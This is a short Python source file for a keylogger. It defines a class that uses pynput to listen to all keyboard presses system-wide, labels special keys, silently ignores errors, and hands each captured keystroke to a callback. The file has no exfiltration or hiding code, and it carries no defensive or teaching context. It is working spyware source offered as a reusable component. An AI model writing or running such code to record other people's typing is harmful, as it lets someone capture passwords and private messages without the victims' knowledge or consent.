import threading
from pynput import keyboard

_KEY_NAMES = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
}


class Keylogger:
    def __init__(self, on_key):
        self._on_key = on_key
        self._listener = None

    def start(self):
        self._listener = keyboard.Listener(on_press=self._handle)
        self._listener.start()

    def stop(self):
        if self._listener:
            self._listener.stop()

    def _handle(self, key):
        try:
            char = _KEY_NAMES.get(key)
            if char is None:
                char = key.char if hasattr(key, "char") and key.char else f"[{key}]"
            self._on_key(char)
        except Exception:
            pass
